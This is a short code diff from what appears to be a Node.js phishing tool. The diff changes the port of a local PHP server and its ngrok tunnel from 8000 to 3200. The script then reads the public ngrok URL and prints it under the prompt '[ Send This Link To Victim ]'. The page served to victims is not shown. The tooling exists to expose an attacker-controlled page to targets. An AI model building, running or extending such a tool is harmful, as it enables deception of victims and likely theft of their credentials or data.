@@ -32,10 +32,10 @@ console.log(c.rainbow("[:——————————————————�
 // Create user input interface 
 
 // Create php local server
-cmd.exec("php -S 127.0.0.1:8000 > /dev/null 2>&1 & ");
+cmd.exec("php -S 127.0.0.1:3200 > /dev/null 2>&1 & ");
 	
 // Make online php server by port forwarding
-cmd.exec("./ngrok http 8000 > /dev/null 2>&1 &");
+cmd.exec("./ngrok http 3200 > /dev/null 2>&1 &");
 
 // Tell user if server already start
 console.log(c.blue("[ Send This Link To Victim ] > " + cmd.exec("curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[0-9a-z]*\.ngrok.io'")));
